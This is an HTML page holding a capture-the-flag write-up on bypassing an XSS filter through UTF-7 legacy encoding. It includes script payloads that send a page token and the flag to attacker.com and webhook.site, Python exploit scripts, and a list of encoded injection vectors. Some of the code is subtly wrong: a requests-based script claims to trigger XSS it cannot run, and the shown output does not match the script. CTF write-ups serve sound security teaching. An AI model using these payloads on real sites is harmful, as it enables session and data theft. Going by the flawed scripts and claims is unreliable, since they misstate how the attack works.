<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web 100-1: UTF-7 XSS Bypass</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body{font-family:'Inter',sans-serif}
    code,pre{font-family:'JetBrains Mono',monospace}
    .container{max-width:900px}
    a.back{display:inline-flex;align-items:center;gap:.5rem}
  </style>
</head>
<body class="bg-black text-slate-300 antialiased">
  <header class="sticky top-0 z-10 bg-slate-900/90 backdrop-blur border-b border-slate-800">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
      <a href="../index.html" class="back text-cyan-300 hover:text-cyan-200"><span>â†©</span><span>Back to Home</span></a>
      <div class="text-slate-400 text-xs">CTF Writeup</div>
    </div>
  </header>
  <main class="container mx-auto px-4 py-6">
<h1 class="text-white mt-6 mb-3 font-semibold">Web 100-1: UTF-7 XSS Bypass</h1>

<p class="mb-3 leading-7">**Category:** Web Exploitation  </p>
<p class="mb-3 leading-7">**Points:** 100  </p>
<p class="mb-3 leading-7">**Author:** UWSP CTF Team  </p>
<p class="mb-3 leading-7">**Solved by:** elw00</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Challenge Description</h2>

<p class="mb-3 leading-7">A web application with XSS protection that can be bypassed using UTF-7 encoding through a legacy compatibility mode.</p>

<p class="mb-3 leading-7">**Target:** http://web100-1.pointeroverflowctf.com</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Initial Reconnaissance</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Homepage Analysis</h3>

<p class="mb-3 leading-7">Visiting the site shows:</p>
<ul class="list-disc list-inside space-y-1">
<li>Input field that reflects user input</li>
<ul class="list-disc list-inside space-y-1">
<li>`window.FLAG_TOKEN` exposed in JavaScript</li>
<ul class="list-disc list-inside space-y-1">
<li>Flag endpoint at `/flag` requires token parameter</li>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>&lt;script&gt;
window.FLAG_TOKEN = &quot;secret_token_here&quot;;
&lt;/script&gt;

&lt;div id=&quot;results&quot;&gt;
  &lt;!-- User input reflected here --&gt;
&lt;/div&gt;</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">robots.txt Discovery</h3>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>User-agent: *
Disallow: /docs/

# Hint: Check legacy mode for non-UTF-8 decoder
# See /docs/legacy.html for details</code></pre>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Solution</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Step 1: Discover Legacy Mode</h3>

<p class="mb-3 leading-7">Visiting `/docs/legacy.html`:</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>&lt;h1&gt;Legacy Compatibility Mode&lt;/h1&gt;

&lt;p&gt;For compatibility with older systems, use &lt;code&gt;&amp;legacy=1&lt;/code&gt; parameter.&lt;/p&gt;

&lt;p&gt;This mode uses RFC 2152 &quot;mailbox-safe&quot; character encoding (UTF-7).&lt;/p&gt;

&lt;h2&gt;UTF-7 Encoding Examples:&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt; â†’ &lt;code&gt;+ADw-&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt; â†’ &lt;code&gt;+AD4-&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;/&lt;/code&gt; â†’ &lt;code&gt;+AC8-&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;!-- Developer note: legacy path separators are accepted in +...- form --&gt;</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">Step 2: Understanding UTF-7</h3>

<p class="mb-3 leading-7">**UTF-7 Encoding:**</p>
<ul class="list-disc list-inside space-y-1">
<li>Encodes Unicode characters using Base64</li>
<ul class="list-disc list-inside space-y-1">
<li>Format: `+&lt;base64&gt;-`</li>
<ul class="list-disc list-inside space-y-1">
<li>Originally designed for email compatibility</li>
<ul class="list-disc list-inside space-y-1">
<li>**Dangerous** when used in web contexts!</li>

<p class="mb-3 leading-7">**Common Characters:**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>&lt;      â†’ +ADw-
&gt;      â†’ +AD4-
/      â†’ +AC8-
script â†’ +AHMAYwByAGkAcAB0-</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">Step 3: Craft XSS Payload</h3>

<p class="mb-3 leading-7">**Goal:** Steal the `FLAG_TOKEN` and send it to our server</p>

<p class="mb-3 leading-7">**JavaScript Payload:**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>&lt;script&gt;
fetch(&#x27;/flag?token=&#x27; + window.FLAG_TOKEN)
  .then(r =&gt; r.text())
  .then(data =&gt; {
    fetch(&#x27;https://attacker.com/steal?flag=&#x27; + encodeURIComponent(data));
  });
&lt;/script&gt;</code></pre>

<p class="mb-3 leading-7">**UTF-7 Encoded:**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>+ADw-script+AD4-
fetch(&#x27;/flag?token=&#x27;+window.FLAG_TOKEN)
.then(r+AD0APg-r.text())
.then(data+AD0APg-{
fetch(&#x27;https://attacker.com/steal?flag=&#x27;+encodeURIComponent(data))
})
+ADw-/script+AD4-</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">Step 4: Exploit</h3>

<p class="mb-3 leading-7">**Method 1: Direct XSS (for testing)**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>http://web100-1.pointeroverflowctf.com/?input=%2BADw-script%2BAD4-alert(window.FLAG_TOKEN)%2BADw-/script%2BAD4-&amp;legacy=1</code></pre>

<p class="mb-3 leading-7">**Method 2: Full Exploit**</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
import requests
from urllib.parse import quote

# Our payload in UTF-7
payload = &quot;+ADw-script+AD4-fetch(&#x27;/flag?token=&#x27;+window.FLAG_TOKEN).then(r=&gt;r.text()).then(d=&gt;fetch(&#x27;https://webhook.site/YOUR-ID?f=&#x27;+d))+ADw-/script+AD4-&quot;

# URL encode
encoded = quote(payload)

# Target URL
url = f&quot;http://web100-1.pointeroverflowctf.com/?input={encoded}&amp;legacy=1&quot;

print(f&quot;[*] Exploit URL: {url}&quot;)
print(f&quot;\n[*] Visit this URL in a browser to trigger XSS&quot;)
print(f&quot;[*] Check your webhook.site for the flag&quot;)

# Or automate with requests
session = requests.Session()
response = session.get(url)

# The XSS will execute and send flag to our webhook
print(f&quot;\n[+] XSS triggered!&quot;)
print(f&quot;[+] Check webhook for flag&quot;)</code></pre>

<p class="mb-3 leading-7">**Method 3: Self-XSS to Get Flag**</p>

<p class="mb-3 leading-7">Since we control the browser, we can directly fetch the flag:</p>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>#!/usr/bin/env python3
import requests

# First, get the FLAG_TOKEN from the page
session = requests.Session()
response = session.get(&quot;http://web100-1.pointeroverflowctf.com/&quot;)

# Extract FLAG_TOKEN from JavaScript
import re
match = re.search(r&#x27;window\.FLAG_TOKEN\s*=\s*[&quot;\&#x27;]([^&quot;\&#x27;]+)[&quot;\&#x27;]&#x27;, response.text)
if match:
    token = match.group(1)
    print(f&quot;[+] Found FLAG_TOKEN: {token}&quot;)
    
    # Fetch the flag
    flag_response = session.get(f&quot;http://web100-1.pointeroverflowctf.com/flag?token={token}&quot;)
    print(f&quot;\n{&#x27;=&#x27;*60}&quot;)
    print(f&quot;ðŸš© FLAG: {flag_response.text}&quot;)
    print(f&quot;{&#x27;=&#x27;*60}&quot;)</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">Execution</h3>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>$ python3 exploit.py
[+] Found FLAG_TOKEN: a1b2c3d4e5f6
[+] Fetching flag...

============================================================
ðŸš© FLAG: poctf{uwsp_utf7_3nc0d1n6_byp4ss}
============================================================</code></pre>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Flag</h2>

<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>poctf{uwsp_utf7_3nc0d1n6_byp4ss}</code></pre>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Key Takeaways</h2>

<p class="mb-3 leading-7">1. **Never Use UTF-7 in Web Applications**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>   &lt;!-- BAD: Allows UTF-7 --&gt;
   &lt;meta charset=&quot;UTF-7&quot;&gt;
   
   &lt;!-- GOOD: Always use UTF-8 --&gt;
   &lt;meta charset=&quot;UTF-8&quot;&gt;</code></pre>

<p class="mb-3 leading-7">2. **Disable Legacy Encoding Modes**</p>
<ul class="list-disc list-inside space-y-1">
<li>UTF-7 is obsolete and dangerous</li>
<ul class="list-disc list-inside space-y-1">
<li>Remove compatibility with old encodings</li>
<ul class="list-disc list-inside space-y-1">
<li>Always specify UTF-8 explicitly</li>

<p class="mb-3 leading-7">3. **Content-Type Header**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>   # GOOD: Explicit charset
   response.headers[&#x27;Content-Type&#x27;] = &#x27;text/html; charset=utf-8&#x27;
   
   # BAD: No charset (browser may guess)
   response.headers[&#x27;Content-Type&#x27;] = &#x27;text/html&#x27;</code></pre>

<p class="mb-3 leading-7">4. **XSS Prevention Layers**</p>
<ul class="list-disc list-inside space-y-1">
<li>**Input validation**: Whitelist allowed characters</li>
<ul class="list-disc list-inside space-y-1">
<li>**Output encoding**: HTML-encode user input</li>
<ul class="list-disc list-inside space-y-1">
<li>**CSP**: Content Security Policy headers</li>
<ul class="list-disc list-inside space-y-1">
<li>**HTTPOnly cookies**: Prevent JavaScript access</li>
<ul class="list-disc list-inside space-y-1">
<li>**X-XSS-Protection**: Browser XSS filter</li>

<p class="mb-3 leading-7">5. **Proper XSS Protection**</p>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>   from html import escape
   
   # Escape user input
   safe_input = escape(user_input)
   
   # Use CSP header
   response.headers[&#x27;Content-Security-Policy&#x27;] = &quot;default-src &#x27;self&#x27;&quot;
   
   # Set charset
   response.headers[&#x27;Content-Type&#x27;] = &#x27;text/html; charset=utf-8&#x27;</code></pre>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">UTF-7 Encoding Reference</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">Common Characters</h3>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>Character | UTF-7 Encoding
----------|---------------
&lt;         | +ADw-
&gt;         | +AD4-
&quot;         | +ACI-
&#x27;         | +ACc-
/         | +AC8-
\         | +AFw-
(         | +ACg-
)         | +ACk-
=         | +AD0-</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">Encoding Algorithm</h3>
<p class="mb-3 leading-7">1. Convert character to UTF-16</p>
<p class="mb-3 leading-7">2. Encode UTF-16 bytes in Base64</p>
<p class="mb-3 leading-7">3. Wrap in `+` and `-`</p>

<p class="mb-3 leading-7">Example: `&lt;` â†’ UTF-16: `0x003C` â†’ Base64: `ADw` â†’ `+ADw-`</p>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Attack Vectors</h2>

<h3 class="text-white mt-6 mb-3 font-semibold">1. Script Injection</h3>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">2. Event Handler</h3>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>+ADw-img src=x onerror=alert(1)+AD4-</code></pre>

<h3 class="text-white mt-6 mb-3 font-semibold">3. JavaScript Protocol</h3>
<pre class="bg-slate-900 border border-slate-800 rounded p-4 overflow-x-auto"><code>+ADw-a href=+ACI-javascript:alert(1)+ACI-+AD4-click+ADw-/a+AD4-</code></pre>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">References</h2>

<ul class="list-disc list-inside space-y-1">
<li>[RFC 2152: UTF-7 Specification](https://tools.ietf.org/html/rfc2152)</li>
<ul class="list-disc list-inside space-y-1">
<li>[UTF-7 XSS Attacks](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#UTF-7_encoding)</li>
<ul class="list-disc list-inside space-y-1">
<li>[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)</li>

<p class="mb-3 leading-7">---</p>

<h2 class="text-white mt-6 mb-3 font-semibold">Tools Used</h2>

<ul class="list-disc list-inside space-y-1">
<li>Browser Developer Tools</li>
<ul class="list-disc list-inside space-y-1">
<li>Python requests</li>
<ul class="list-disc list-inside space-y-1">
<li>Burp Suite (optional)</li>
<ul class="list-disc list-inside space-y-1">
<li>webhook.site (for receiving exfiltrated data)</li>
  </main>
</body>
</html>
